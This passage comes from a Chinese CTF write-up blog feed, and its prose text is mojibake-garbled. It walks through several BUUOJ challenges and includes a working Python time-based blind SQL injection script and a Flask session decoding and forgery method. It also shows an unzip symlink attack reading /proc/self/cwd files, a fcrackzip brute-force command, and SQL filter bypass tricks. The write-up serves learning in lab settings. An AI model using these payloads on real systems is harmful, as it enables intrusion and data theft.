src="4.PNG"></p><p>è§‚å¯Ÿä¸‹é¢çš„æ—¶é—´ï¼Œç¬¬ä¸€ä¸ªæ˜¯é”™è¯¯çš„æ‰€ä»¥ååº”æ—¶é—´æ˜¯0ç§’ï¼Œä½†æ˜¯ç¬¬äºŒä¸ªæ˜¯æ­£ç¡®çš„æ‰€ä»¥ååº”æ—¶é—´æ˜¯5ç§’ã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡asciiï¼Œsubstræ¥è·å–æ•°æ®åº“çš„åç§°ä¹‹ç±»çš„</p><p><img src="5.PNG"></p><p><img src="6.PNG"></p><p>okï¼Œå…¶å®æƒ³è¦çŸ¥é“æ˜¯ä¸æ˜¯åˆé‚£ä¸ªæ—¶é—´å¿™è‘—ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡select if(1=1,sleep(2),0);å°±é€šè¿‡æ—¶é—´æ¥è¿›è¡Œåˆ¤æ–­</p><p>ç„¶ååœ¨å¤ä¹ ä¸€ä¸‹é¢„å¤„ç†</p><p>set @a=sqlè¯­å¥ï¼›prepare test from @a;execute test;</p><p><img src="7.PNG"></p><p>ç„¶åå†™è„šæœ¬</p><pre><code>#author: c1e4rimport requestsimport jsonimport timedef main():#é¢˜ç›®åœ°å€url = &#39;&#39;&#39;http://568215bc-57ff-4663-a8d9-808ecfb00f7f.node3.buuoj.cn/index.php?r=Login/Login&#39;&#39;&#39;#æ³¨å…¥payloadpayloads = &quot;asd&#39;;set @a=0x&#123;0&#125;;prepare ctftest from @a;execute ctftest-- -&quot;flag = &#39;&#39;for i in range(1,30):    #æŸ¥è¯¢payload    payload = &quot;select if(ascii(substr((select flag from flag),&#123;0&#125;,1))=&#123;1&#125;,sleep(3),1)&quot;    for j in range(0,128):        #å°†æ„é€ å¥½çš„payloadè¿›è¡Œ16è¿›åˆ¶è½¬ç å’Œjsonè½¬ç         datas = &#123;&#39;username&#39;:payloads.format(str_to_hex(payload.format(i,j))),&#39;password&#39;:&#39;test213&#39;&#125;        data = json.dumps(datas)        times = time.time()        res = requests.post(url = url, data = data)        if time.time() - times &gt;= 3:            flag = flag + chr(j)            print(flag)            breakdef str_to_hex(s):return &#39;&#39;.join([hex(ord(c)).replace(&#39;0x&#39;, &#39;&#39;) for c in s])if __name__ == &#39;__main__&#39;:main()</code></pre><p>éƒ½è·‘ä¸å‡ºæ¥</p><p>ç»“æœå°±æ˜¯glzjin_wants_a_girl_friend.zipï¼Œå¾—åˆ°æºç ï¼Œé‡Œé¢æœ‰ä¸€ä¸ªflagã€‚phpï¼Œä½†æ˜¯æ²¡ç”¨ï¼Œæˆ‘ä»¬ä»…ä»…æ˜¯çŸ¥é“flagå­˜åœ¨ä¸flag.phpï¼Œæœ‰çœ‹åˆ°è¯´é…ç½®ä¸€èˆ¬åœ¨Controllerè¿™ä¸ªæ–‡ä»¶é‡Œé¢ï¼Œäºæ˜¯æœºå‹ä»£ç å®¡è®¡</p><p><img src="10.PNG"></p><p><img src="8.PNG"></p><p>è¿™é‡Œæœ‰ä¸€ä¸ªincludeï¼Œåº”è¯¥æ˜¯å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´ç„¶åä¹Ÿå­˜åœ¨extractå­˜åœ¨è¦†ç›–</p><p>æˆ‘ä»¬å¯ä»¥çœ‹çœ‹é‚£é‡Œæœ‰æ¶‰åŠåˆ°äº†è¿™ä¸ªå‡½æ•°</p><p><img src="9.PNG"></p><p>å‘ç°æœ‰é‚£ä¸ªrequestçš„æäº¤æ–¹å¼ï¼Œäºæ˜¯</p><p><img src="11.PNG"></p><p>æ„é€ </p><p><img src="12.PNG"></p><p>å¾—åˆ°flag</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>misc-é‡‘ä¸‰èƒ–ï¼ŒäºŒç»´ç </title>
      <link href="/2021/05/21/misc-%E9%87%91%E4%B8%89%E8%83%96%EF%BC%8C%E4%BA%8C%E7%BB%B4%E7%A0%81/"/>
      <url>/2021/05/21/misc-%E9%87%91%E4%B8%89%E8%83%96%EF%BC%8C%E4%BA%8C%E7%BB%B4%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€</p><span id="more"></span><h2>é‡‘ä¸‰èƒ–</h2><p>è¿™é“é¢˜ç›®çš„é™„ä»¶ä¸‹è½½ä¸‹æ¥å°±æ˜¯gifï¼Œç„¶åéšç€gifåŠ¨ç”»çš„è·³åŠ¨ï¼Œå¯ä»¥çœ‹éƒ½æœ‰flagçš„å­—æ ·ï¼Œç„¶åç”¨psæ‰“å¼€å°±å¯ä»¥çœ‹åˆ°ç»™gifæ¯ä¸€å¸§çš„åŠ¨ç”»ï¼Œå¾—åˆ°flag</p><h2>äºŒç»´ç </h2><p>ä¸‹è½½é™„ä»¶æ˜¯ä¸€ä¸ªäºŒç»´ç ï¼Œæ‰«ä¸€ä¸‹æ²¡æœ‰ä»€ä¹ˆæ”¶è·ï¼Œç”¨foremoståˆ†ç¦»å¾—åˆ°ä¸€ä¸ªzipæ–‡ä»¶ï¼Œæœ‰å¯†ç </p><p>æˆ‘ä¸€å¼€å§‹æƒ³çš„æ˜¯ä¼ªåŠ å¯†ï¼Œç„¶åé”™äº†å˜›ï¼Œä½†æ˜¯è¿˜æ˜¯è¦è®°å½•ä¸€ä¸‹ä¼ªåŠ å¯†å­¦åˆ°çš„çŸ¥è¯†</p><p>ä¸€ä¸ªzipæ–‡ä»¶ç”±å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒºï¼Œå‹ç¼©æºæ–‡ä»¶ç›®å½•åŒºï¼Œå‹ç¼©æºæ–‡ä»¶ç›®å½•ç»“æŸæ ‡å¿—</p><p>é™¢æ‰€æºæ–‡ä»¶æ•°æ®åº“</p><p>50 4B 03 04:è¿™æ˜¯å¤´æ–‡ä»¶çš„æ ‡å¿—</p><p>14 00:è§£å‹æ–‡ä»¶çš„pkwareç‰ˆæœ¬</p><p>00 00ï¼šå…¨å±€æ–¹å¼ä½æ ‡è®°(æœ‰æ— åŠ å¯†)</p><p>08 00ï¼šå‹ç¼©æ–¹å¼</p><p>å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒºï¼š</p><p>50 4B 01 02:ç›®å½•ä¸­æ–‡ä»¶å¤´æ ‡å¿—</p><p>3F 00:è§£å‹ä½¿ç”¨çš„pkwareç‰ˆæœ¬</p><p>14 00ï¼šè§£å‹æ–‡ä»¶æ‰€éœ€çš„pkwareç‰ˆæœ¬</p><p>00 00ï¼šå…¨å±€æ–‡ä»¶ä½æ ‡è®°ï¼ˆæœ‰æ— åŠ å¯†ï¼Œè¿™é‡Œå°±æ˜¯æ˜¯å¦è¿›è¡Œä¼ªåŠ å¯†çš„å…³é”®ç‚¹ï¼‰</p><p>08 00ï¼šå‹ç¼©æ–¹å¼</p><p>å¦‚æœå‹ç¼©æºæ–‡ä»¶æ•°æ®åŒºçš„å…¨å±€æ–¹å¼ä¸º00 00 ä½†æ˜¯å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒºæ˜¯09 00å°±è¯´æ˜æ˜¯ä¼ªåŠ å¯†ï¼Œä½†æ˜¯è¿™ä¸ªé‡Œé¢ä¸¤ä¸ªåœ°æ–¹éƒ½æ˜¯09 09ï¼Œæ‰€è¯´æ˜æ˜¯çœŸåŠ å¯†ï¼Œç„¶åä½¿ç”¨kaliä¸Šçš„å·¥å…·çˆ†ç ´å¯†ç fcrakzip -b -c â€˜aA1:â€™ -l 4 -u 00000000.zipæ¥çˆ†ç ´</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ciscn-upload</title>
      <link href="/2021/05/20/ciscn-upload/"/>
      <url>/2021/05/20/ciscn-upload/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€</p><span id="more"></span><p>æ‰“å¼€é¢˜ç›®å³æ˜¯æºç ï¼Œè¿˜æ‰«é™¤æ¥ä¸€ä¸ªexample.php</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SWPU2019-Web3</title>
      <link href="/2021/05/19/SWPU2019-Web3/"/>
      <url>/2021/05/19/SWPU2019-Web3/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€<br>åšçš„æ—¶å€™æ‰å‡ºæ¥æ˜¯flaskä¼ªé€ äº†ï¼Œä½†æ˜¯å°±æ˜¯ä¸çŸ¥é“keyè¯¥æ€ä¹ˆæ‰¾</p><span id="more"></span><p><img src="1.PNG"></p><p>æ‰“å¼€ç™»å½•é¡µé¢ï¼Œç„¶åå°±å…ˆéšä¾¿æ³¨å†Œä¸€ä¸ªä¸Šå»ï¼Œä¹‹åä¼šçœ‹è§æ˜¾ç¤ºè¯´</p><p><img src="2.PNG"></p><p>æˆ‘å½“æ—¶ä»¥ä¸ºæ˜¯sstiæ¨¡æ¿æ³¨å…¥ï¼Œå› ä¸ºå®ƒæ ‡é¢˜ä¹Ÿæ˜¯flaskå˜›ï¼Œæˆ‘å°±å…ˆè¯•è¯•4ï¼Œä½†æ˜¯å®ƒæ²¡æœ‰ååº”ï¼Œæ˜¾ç¤ºçš„ä¾ç„¶æ˜¯your name is 4ï¼Œç„¶åæˆ‘åˆæƒ³è¯´æ˜¯ä¸æ˜¯æ˜¯åœ¨urlåé¢ç›´æ¥åŠ ä¸Šï¼Ÿname=xxxï¼Œä½†æ˜¯ä¾ç„¶ä¸å¯¹ã€‚åæ¥æˆ‘ç‚¹å‡»ä¸€ä¸‹uploadé‚£ä¸ªæŒ‰é’®ï¼Œå‘ç°æœ‰æç¤ºè¯´æ˜¯æƒé™ä¸å¤Ÿï¼Œç„¶åæœæ–­æŠ“åŒ…çœ‹sessionï¼Œæœç„¶æœ‰é—®é¢˜ï¼Œå®ƒè¿™é‡Œçš„sessioné•¿å¾—ç‰¹åˆ«å‘å¯’å‡å¼€å­¦å®éªŒå®¤æ¯”èµ›é‡Œçš„sessionï¼Œå¾€æ˜¯ä¸æ˜¯sessionä¼ªé€ é‚£æ–¹é¢è€ƒè™‘äº†ã€‚</p><p>ç„¶åå…ˆç”¨è„šæœ¬å°†sessionè§£å¯†</p><pre><code>#!/usr/bin/env python3import sysimport zlibfrom base64 import b64decodefrom flask.sessions import session_json_serializerfrom itsdangerous import base64_decodedef decryption(payload):    payload, sig = payload.rsplit(b&#39;.&#39;, 1)    payload, timestamp = payload.rsplit(b&#39;.&#39;, 1)    decompress = False    if payload.startswith(b&#39;.&#39;):        payload = payload[1:]        decompress = Truetry:        payload = base64_decode(payload)    except Exception as e:        raise Exception(&#39;Could not base64 decode the payload because of &#39;                     &#39;an exception&#39;)if decompress:    try:        payload = zlib.decompress(payload)    except Exception as e:        raise Exception(&#39;Could not zlib decompress the payload before &#39;                         &#39;decoding the payload&#39;)return session_json_serializer.loads(payload)if __name__ == &#39;__main__&#39;:    print(decryption(sys.argv[1].encode()))</code></pre><p>è§£å¯†å‡ºæ¥æ˜¯</p><pre><code>&#123;&#39;id&#39;: b&#39;100&#39;, &#39;is_login&#39;: True, &#39;password&#39;: &#39;admin&#39;, &#39;username&#39;: &#39;admin&#39;&#125;</code></pre><p>ç„¶åæˆ‘ä»¬å°±è¦æƒ³æ€ä¹ˆå»è¿›è¡Œææƒäº†ï¼Œçœ‹WPè¯´è¿™ä¸ªbâ€™100â€™,æ”¹ä¸ºbâ€™1â€™å¯ä»¥ææƒï¼Œç„¶åå°±è¦æ€ä¹ˆå»æ‰¾å¯†é’¥è¿›è¡Œsessionä¼ªé€ ï¼Œæˆ‘å¡åœ¨äº†è¿™ï¼Œæˆ‘ä¸€ç›´åœ¨æƒ³åœ¨å“ªå»Â·æ‰¾å¯†é’¥ï¼Œæ•´ä¸ªç•Œé¢çœ‹èµ·æ¥èƒ½å­˜åœ¨æ¼æ´çš„åœ°æ–¹å°±æ˜¯é‚£ä¸ªyour name is adminï¼Œæˆ‘ä¹Ÿåœ¨ç½‘ä¸Šçœ‹ä¸€äº›ä¾‹é¢˜è¯´æ˜¯å¯ä»¥åœ¨configä¸­æ‰¾åˆ°ï¼Œæ‰€ä»¥æˆ‘å†ä¸€æ¬¡æƒ³åˆ°äº†ï¼Œç„¶è€Œè¿˜æ˜¯æ²¡ç”¨ã€‚</p><p>ç‰¹åˆ«ç§€ï¼Œçœ‹å®Œwpï¼Œè¯´å½“è®¿é—®ä¸€ä¸ªä¸å­˜åœ¨çš„ç½‘é¡µçš„æ—¶å€™ï¼Œä¼šåœ¨è¯·æ±‚å¤´é‚£é‡Œå‡ºç°å¯†é’¥ï¼Œç„¶åæˆ‘å°è¯•è®¿é—®admin</p><p><img src="3.PNG"></p><p>base64è§£ç å¾—åˆ°å¯†é’¥ï¼Œç„¶åè¿›è¡Œcookieä¼ªé€ ï¼ŒæˆåŠŸè¿›å…¥ä¸Šä¼ é¡µé¢ã€‚</p><pre><code>@app.route(&#39;/upload&#39;,methods=[&#39;GET&#39;,&#39;POST&#39;])def upload():if session[&#39;id&#39;] != b&#39;1&#39;:    return render_template_string(temp)if request.method==&#39;POST&#39;: # è·å–postä¼ å‚ï¼Œ    m = hashlib.md5()    name = session[&#39;password&#39;]    name = name+&#39;qweqweqwe&#39;    name = name.encode(encoding=&#39;utf-8&#39;)    m.update(name) # password+ **  ä¹‹åçš„md5å€¼ï¼Œ    md5_one= m.hexdigest() # è¿™ä¸ªæ˜¯ æ˜¯ä¸æ˜¯md5æ‹“å±•æ”»å‡»å•Šï¼Œæ²¡æœ‰å›æ˜¾ï¼Œå¾—ä¸åˆ°ä¸€ç»„å·²çŸ¥çš„ç›å’Œæ˜æ–‡ä¼°è®¡ä¸æ˜¯    n = hashlib.md5()    ip = request.remote_addr # è¿™ä¸ªremote_addræˆ‘è¿˜ä¸æ˜¯å¾ˆç†Ÿæ‚‰å•Šï¼Œï¼Œå¥½åƒPHPä¸­çš„æˆ‘ä¹Ÿä¸ç†Ÿæ‚‰ã€‚ã€‚ã€‚ï¼ˆæ±—ï¼‰    ip = ip.encode(encoding=&#39;utf-8&#39;)    n.update(ip)    md5_ip = n.hexdigest() # è¿˜æœ‰ipçš„md5    f=request.files[&#39;file&#39;]    basepath=os.path.dirname(os.path.realpath(__file__)) # å°±æ˜¯è·å¾—å½“å‰æ–‡ä»¶çš„ç›®å½•å˜›ï¼Œå°±æ˜¯è¿™ä¸ªpyæ–‡ä»¶æ‰€åœ¨çš„ç›®å½•ï¼Œ    path = basepath+&#39;/upload/&#39;+md5_ip+&#39;/&#39;+md5_one+&#39;/&#39;+session[&#39;username&#39;]+&quot;/&quot;    path_base = basepath+&#39;/upload/&#39;+md5_ip+&#39;/&#39;    filename = f.filename    pathname = path+filename    if &quot;zip&quot; != filename.split(&#39;.&#39;)[-1]: # æ£€æŸ¥åç¼€ï¼Œ        return &#39;zip only allowed&#39;    if not os.path.exists(path_base): # ä¸å­˜åœ¨ç›®å½•çš„è¯ï¼Œåˆ›å»ºä¸€ä¸ª        try:            os.makedirs(path_base)        except Exception as e:            return &#39;error&#39;    if not os.path.exists(path): # è¿›ä¸€æ­¥ï¼Œå¦‚æœä¸å­˜åœ¨ç›®å½•çš„åŒ–ï¼Œåˆ›å»ºä¸€ä¸ª        try:            os.makedirs(path)        except Exception as e:            return &#39;error&#39;    if not os.path.exists(pathname): # è¯¥ç›®å½•ä¸‹ï¼Œæ˜¯å¦å­˜åœ¨è¿™ä¸ªæ–‡ä»¶ï¼Œæœ‰ï¼Œå°±ä¿å­˜ï¼Œ        try:            f.save(pathname)        except Exception as e:            return &#39;error&#39;    try:        cmd = &quot;unzip -n -d &quot;+path+&quot; &quot;+ pathname # å°±æ˜¯ä¸è¦†ç›–æ–‡ä»¶è§£å‹è¯¥zipæ–‡ä»¶åˆ°è¯¥ç›®å½•ä¸‹ï¼Œ        if cmd.find(&#39;|&#39;) != -1 or cmd.find(&#39;;&#39;) != -1: # å¦‚æœæ‰¾åˆ°äº† | æˆ–è€… ï¼› å°± ä¸è¡Œï¼Œ            waf()            return &#39;error&#39;        os.system(cmd)    except Exception as e:        return &#39;error&#39;    unzip_file = zipfile.ZipFile(pathname,&#39;r&#39;)    unzip_filename = unzip_file.namelist()[0] # unzip_filename è¿™ä¸ªæ˜¯ä¸€ä¸ªåˆ—è¡¨æ¥¼    # f = zipfile.ZipFile(filename, &#39;r&#39;) # è¿™é‡Œçš„ç¬¬äºŒä¸ªå‚æ•°ç”¨rè¡¨ç¤ºæ˜¯è¯»å–zipæ–‡ä»¶    # ã€€unzip_file.namelist() ï¼šè·å–zipæ–‡æ¡£å†…æ‰€æœ‰æ–‡ä»¶çš„åç§°åˆ—è¡¨ã€‚    if session[&#39;is_login&#39;] != True:        return &#39;not login&#39;    try:        if unzip_filename.find(&#39;/&#39;) != -1: # å¦‚æœæ–‡ä»¶åä¸­æ²¡æœ‰æ‰¾åˆ° /            shutil.rmtree(path_base) # é€’å½’çš„åˆ é™¤æ–‡ä»¶ï¼Œè¿™ä¸ªpath_baseæ˜¯åˆ°ipçš„æ–‡ä»¶å¤¹ï¼Œæ— æ‰€è°“ä¹ˆï¼Œåæ­£éƒ½åˆ é™¤äº†ï¼Œï¼Œ            os.mkdir(path_base) # åˆ›å»ºä¸€ä¸ªæ–°çš„ï¼Œ            return &#39;error&#39;        image = open(path+unzip_filename, &quot;rb&quot;).read() # åªè¯»äºŒè¿›åˆ¶æ‰“å¼€è¿™ä¸ªæ–‡ä»¶ï¼Œç„¶åè¯»å–ï¼ŒäºŒè¿›åˆ¶è¯»å–ï¼Œåº”è¯¥æ˜¯å›¾ç‰‡äº†å•Š ï¼Œ        resp = make_response(image)        resp.headers[&#39;Content-Type&#39;] = &#39;image/png&#39;        return resp    except Exception as e:        shutil.rmtree(path_base)        os.mkdir(path_base)        return &#39;error&#39;return render_template(&#39;upload.html&#39;)@app.route(&#39;/showflag&#39;)def showflag():if True == False: # è¿™ä¸ªæ˜¯çœŸçš„ç§€èµ·æ¥äº†å•Šï¼Œï¼Œï¼Œå¯èƒ½æ˜¯è¦ä¿®æ”¹ä»€ä¹ˆå‚æ•°æŠŠï¼Œï¼Œä¸çŸ¥å•Šï¼Œä¿®æ”¹å‚æ•°èƒ½æŠŠä»–ä¿©æ”¹çš„ç›¸ç­‰ï¼Ÿï¼ï¼Ÿï¼ï¼Ÿï¼é‚£æ˜¯çœŸçš„ç§€ï¼Œ    image = open(os.path.join(&#39;./flag/flag.jpg&#39;), &quot;rb&quot;).read()    resp = make_response(image)    resp.headers[&#39;Content-Type&#39;] = &#39;image/png&#39;    return respelse:    return &quot;can&#39;t give you&quot;</code></pre><p>åœ¨ç½‘ä¸Šçœ‹è§çš„ä»¥ä¸ºåšä¸»å†™çš„ï¼Œæˆ‘äººèœè¿˜ä¸å–œæ¬¢åˆ†æä»£ç ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚çœŸçš„æ˜¯</p><p>æ€»ä½“æ¥è¯´å°±æ˜¯ç¬¬ä¸€éœ€è¦ä¼ é€’ä»¥.zipç»“å°¾çš„å›¾ç‰‡</p><blockquote><p>if â€œzipâ€ != filename.split(â€˜.â€™)[-1]: # æ£€æŸ¥åç¼€ï¼Œ<br>            return â€˜zip only allowedâ€™</p></blockquote><p>ç„¶åç¬¬äºŒï¼ŒæœåŠ¡å™¨ä¼šè§£å‹æˆ‘ä»¬ä¼ é€’çš„æ–‡ä»¶</p><blockquote><p>unzip -n -d â€œ+path+â€ â€œ+ pathname </p></blockquote><p>æˆ‘ä»¬è¦ç©¿çš„æ–‡ä»¶æ˜¯å›¾ç‰‡</p><blockquote><p>open(path+unzip_filename, â€œrbâ€).read()å› ä¸ºè¿™é‡Œæ˜¯äºŒè¿›åˆ¶è¯»å–</p></blockquote><p>æœ€åï¼Œæˆ‘ä»¬ä¼ çš„æ–‡ä»¶åä¸èƒ½æœ‰â€˜/â€™</p><p>å› ä¸ºæˆ‘ä¸å¤§æ¸…æ¥šè·¯ç”±å˜›ï¼Œç„¶åæˆ‘å°±å¾ˆå¥‡æ€ªï¼Œä¸ºä»€ä¹ˆä¸‹é¢æœ‰ä¸€ä¸ªshowflagçš„è·¯ç”±ï¼Œç„¶åç»™äº†ä¸€ä¸ªå›¾ç‰‡çš„åœ°å€./flag/flag.jpgï¼Œå¾ˆè¿·æƒ‘ï¼Œä½†æ˜¯æ„Ÿè§‰è‚¯å®šä¸èƒ½è¯»åˆ°äº†æ¯•ç«Ÿtrueç»å¯¹ä¸ä¼šç­‰äºfalseå•Šï¼Œé‚£æˆ‘æ„Ÿè§‰è¿™æ®µä»£ç å­˜åœ¨çš„æ„æ€å°±æ˜¯åœ¨å‘Šè¯‰æˆ‘ï¼Œæˆ‘ä»¬è¿™é‡Œå­˜åœ¨ä¸€ä¸ªflag.jpgç„¶åæˆ‘æŠŠè·¯å¾„ç»™ä½ çœ‹ä½ èƒ½ä¸èƒ½æ‹¿åˆ°</p><p>é‚£æˆ‘æƒ³å¯ä»¥å¯ä»¥ä¼ ä¸€ä¸ªå›¾ç‰‡é©¬ï¼Œä½†æ˜¯æˆ‘ä¸Šä¼ ä¹‹åå°±å‡ºç°é”™è¯¯äº†ï¼Œè¿”å›äº†errorï¼Œä»£ç é‡Œé¢æœ‰ä¸€æ®µæ˜¯ä¸èƒ½å‡ºç°â€˜ï¼›â€™è¿™ä¸ªç¬¦å·çš„</p><p>ç„¶åå°±å¾ˆä¸çŸ¥æ‰€æª</p><p>çœ‹wpè¯´unzipå­˜åœ¨ä¸€ä¸ªæ¼æ´å°±æ˜¯unzipè½¯è¿æ¥æ”»å‡»ï¼Œå¯ä»¥ä¸Šä¼ è½¯è¿æ¥çš„å‹ç¼©åŒ…æ¥è¯»å–æ–‡ä»¶ã€‚å°±æ˜¯ç›¸å½“äºwindowsé‡Œé¢çš„å¿«æ·æ–¹å¼ï¼Œå…¶å®å¿«æ·æ–¹å¼é‚£ä¸ªæ–‡ä»¶é‡Œå­˜å‚¨çš„æ˜¯çœŸæ­£æ–‡ä»¶çš„åœ°å€ã€‚</p><p>åœ¨kaliä¸Šï¼Œä½¿ç”¨ ln -så‘½ä»¤ç›¸å½“äºåˆ›å»ºä¸€ä¸ªè½¯è¿æ¥</p><p>åˆæ˜¯é‚£ä¸ª/proc/self/cwdæˆ‘ä¸çŸ¥é“è§è¿‡å‡ æ¬¡äº†ä½†ä¾æ—§è¿˜æ˜¯å¾ˆè’™è”½ï¼Œå°±æ˜¯æŒ‡å‘å½“å‰è¿›ç¨‹</p><p>å†™å‡ºè¿™æ ·çš„è½¯è¿æ¥ln -s /proc/self/cwd/flag/flag.jpg test</p><p>å…¶å®è§£é‡Šå³ä½¿proc/self/cwdå°±å¯ä»¥æŒ‡å‘flaské‚£ä¸ªç›®å½•ï¼Œç„¶åç›®å½•åœ¨è¯¦ç»†ä¸€äº›å°±æ˜¯åœ¨flag/flagã€‚jpg</p><p>ç„¶åæˆ‘ä»¬å°†å…¶testå˜æˆæŒ‡å‘è¿™ä¸ªåœ°å€çš„å¿«æ·æ–¹å¼</p><p>ç„¶åå°†å…¶è¿›è¡Œå‹ç¼©</p><p>zip -ry test.zip test </p><p>r:é€’å½’å¤„ç†æ–‡ä»¶ä¸‹æ‰€æœ‰çš„å­æ–‡ä»¶<br>yï¼šç›´æ¥å¤„ç†è½¯è¿æ¥ï¼Œè€Œéå¤„ç†å®ƒæ‰€å­˜åœ¨çš„åœ°å€æ‰€æŒ‡å‘çš„æ–‡ä»¶</p><p>å¦‚æœæˆ‘ä»¬ç›´æ¥åªç”¨rå‚æ•°æ˜¯ä¼šæŠ¥é”™çš„ï¼Œå› ä¸ºæˆ‘ä»¬ç”µè„‘é‡Œæ ¹æœ¬å°±æ²¡æœ‰è¿™ä¸ªflag/flag.jpgè¿™ä¸ªæ–‡ä»¶</p><p><img src="4.PNG"></p><p>ç„¶åä¸Šä¼ ï¼ŒæŠ“åŒ…å¾—åˆ°flag</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SWPU2019-Web1</title>
      <link href="/2021/05/17/SWPU2019-Web1/"/>
      <url>/2021/05/17/SWPU2019-Web1/</url>
      
        <content type="html"><![CDATA[<p>#å†™åœ¨å‰é¢</p><p>è¿™é“é¢˜è™½ç„¶æ²¡æœ‰åšå‡ºæ¥ï¼Œä½†æ˜¯æˆ‘æ‰¾åˆ°äº†æ³¨å…¥ç‚¹ï¼Œæˆ‘ä¸å†æ˜¯ä»å‰å“ªä¸ªå“ªä¸ªç±»å‹çš„é¢˜ç›®éƒ½ä¸çŸ¥é“çš„å°åƒåœ¾çš„ã€‚ä½†æ˜¯ã€‚ã€‚ã€‚å› ä¸ºçŸ¥è¯†å‚¨å¤‡çš„å¤ªå°‘ï¼Œæˆ‘ä¾ç„¶æ²¡æœ‰åšå‡ºæ¥</p><span id="more"></span><h2>å‰ç½®çŸ¥è¯†</h2><blockquote><p>group by</p></blockquote><p><a href="https://www.cnblogs.com/wangtanzhi/p/12590172.html">order byå¸Œæœ›å­¦ä¹ ä¸€ä¸‹</a></p><p>åœ¨åšè¿™é“é¢˜ç›®çš„æ—¶å€™ï¼Œæˆ‘fuzzå‘ç°#è¢«è¿‡æ»¤ï¼Œæˆ‘å°±æƒ³è¯´è¿™è¦æ€ä¹ˆè¿›è¡Œæ³¨é‡Šï¼Œç„¶åæˆ‘ç‰¹åˆ«å•¥çš„è¯•äº†ä¸‹%23ï¼Œå“‡å¶ï¼Œå®ƒæ²¡æœ‰è¢«è¿‡æ»¤ã€‚ã€‚ã€‚ã€‚ã€‚å…¶å®è¿™ä¸ªä¸æ˜¯url<br>ä¸ä¼šè¿›è¡Œurlè§£ç ï¼Œæ‰€ä»¥è¿™ä¸ª%23ï¼Œæ˜¯æ²¡æœ‰ä»»ä½•ä½œç”¨çš„ï¼Œæ‰€ä»¥æˆ‘å­¦åˆ°äº†ä¸€ç§æ–°çš„æ–¹æ³•ï¼š</p><p>1â€™,xxx,â€™1,åœ¨è¾“å…¥ä¸€ä¸ªæ•°æ®å°†å…¶é—­åˆ</p><p>å…¶å®æˆ‘å­¦sqlä»¥æ¥ï¼Œåœ¨çˆ†åº“çš„æ—¶å€™å°±å­¦äº†ä¸¤ç§æ–¹æ³•ï¼Œé€šè¿‡è”åˆæŸ¥è¯¢ï¼Œå¦å¤–å°±æ˜¯æŠ¥é”™æ³¨å…¥ï¼Œå †å æ³¨å…¥ä¹Ÿç®—æ˜¯ä¸€ç§æŠŠã€‚ä½†æ˜¯æˆ‘å†…å¿ƒä¸çŸ¥é“ä¸ºå•¥æ€»æ˜¯æ¯”è¾ƒæŠµè§¦è”åˆæŸ¥è¯¢ï¼Œå› ä¸ºè”åˆæŸ¥è¯¢ç¬¬ä¸€ç‚¹å°±æ˜¯è¦è¿›è¡Œçœ‹æœ‰å‡ ä¸ªå­—æ®µå˜›ï¼Œæˆ‘å› ä¸ºä¸æ˜¯ç‰¹åˆ«ç†è§£ order byè·Ÿgroup byï¼Œæ‰€ä»¥æ€»æ˜¯ä¸å–œæ¬¢ç”¨è¿™ä¸ªï¼Œå¦å¤–å†…å¿ƒè§‰å¾—è¿™ä¸ªå¾ˆç®€å•ï¼ˆå› ä¸ºæˆ‘å…¥é—¨çš„æ—¶å€™ï¼Œç¬¬ä¸€ä¸ªæ¥è§¦çš„å°±æ˜¯è¿™ä¸ªï¼Œæ‰€ä»¥å°±æ„Ÿè§‰ä¸ä¼šç”¨åˆ°ï¼Œä½†æ˜¯è¿™æ˜¯å¤§é”™ç‰¹é”™ï¼ï¼ï¼ï¼ï¼‰</p><p><img src="1.PNG"></p><p>å…ˆçœ‹ä¸‹order byï¼Œæˆ‘ç†è§£äº†ä»€ä¹ˆæ„æ€ï¼Œå°±æ˜¯å¦‚æœæˆ‘ä»¬è¾“å…¥1â€™ order by 4 ,â€™1</p><p>é‚£æˆ‘ä»¬è¾“å…¥çš„å…¶å®æ˜¯select * from â€˜1â€™ order by 3,â€™1â€™</p><p><img src="2.PNG"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹ä¸€ä¸‹å­—ç¬¦å‹å’Œæ•°å­—æ€§çš„ï¼Œå¦‚æœæ˜¯å›¾ä¸­çš„ç¬¬ä¸€ä¸ªå°±æ˜¯æŒ‰ç…§ç¬¬å‡ åˆ—çš„æŸä¸­é¡ºåºè¿›è¡Œæ’åˆ—ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ä»1è¾“åˆ°ä¸€ä¸ªä»»æ„æŒ‡å¯¼å‡ºç°æŠ¥é”™çš„è¾“å°±ä»£è¡¨æˆ‘ä»¬æˆåŠŸäº†</p><p>group byåœ¨æˆ‘ç†è§£æ¥å°±æ˜¯å»é™¤äº†ä½ è¦çš„å“ªä¸€åˆ—çš„é‡å¤é¡¹</p><p><img src="3.PNG"></p><p><img src="4.PNG"></p><p>ç„¶åæˆ‘ä»¬å°±å¯ä»¥ç”¨è¿™ä¸¤ä¸ªå‡½æ•°æ¥å»fuzzæœ‰å‡ ä¸ªå­—æ®µã€‚</p><p><img src="5.PNG"></p><p>å›åˆ°æˆ‘ä»¬é¢˜ç›®ä¸Šï¼Œå› ä¸ºå¦‚æœè¾“å…¥ç©ºæ ¼ï¼Œæ¯”å¦‚show databases;å®ƒä¼šè‡ªåŠ¨å˜æˆshowdatabasesï¼›å°±ä¼šå‡ºé”™ï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨/**/æ¥è¿›è¡Œè¿‡æ»¤ï¼Œç„¶åå› ä¸ºorder byè¢«è¿‡æ»¤æ‰€ä»¥æˆ‘ä»¬åªèƒ½ä½¿ç”¨group 